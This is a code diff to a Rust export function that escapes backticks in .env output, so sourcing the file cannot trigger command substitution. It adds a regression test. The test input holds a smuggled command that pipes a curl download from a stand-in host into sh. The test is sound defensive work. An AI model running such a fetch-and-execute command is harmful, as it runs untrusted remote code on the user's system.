@@ -307,7 +307,9 @@ pub fn env_export(entries: &[DataEntry]) -> (String, usize) {
             let escaped = value
                 .replace('\\', "\\\\")
                 .replace('"', "\\\"")
-                .replace('$', "\\$");
+                .replace('$', "\\$")
+                // A shell runs `…` inside double quotes too: sourcing the file must stay inert.
+                .replace('`', "\\`");
             out.push_str(&format!("{}=\"{escaped}\"\n", entry.key));
         }
     }
@@ -1464,11 +1466,12 @@ mod tests {
             DataEntry::text("config.yaml", "a: 1\nb: 2\n"),
             DataEntry::text("EMPTY", ""),
             DataEntry::binary("blob", vec![0, 1]),
+            DataEntry::text("SNEAKY", "x`curl example.com|sh`"),
         ];
         let (env, skipped) = env_export(&entries);
         assert_eq!(
             env,
-            "LOG_LEVEL=info\nGREETING=\"hello \\\"world\\\" \\$HOME\"\nEMPTY=\n"
+            "LOG_LEVEL=info\nGREETING=\"hello \\\"world\\\" \\$HOME\"\nEMPTY=\nSNEAKY=\"x\\`curl example.com|sh\\`\"\n"
         );
         assert_eq!(skipped, 2);
         let yaml = yaml_export(&json!({"data": {"a": "1", "b": "x\ny"}}));
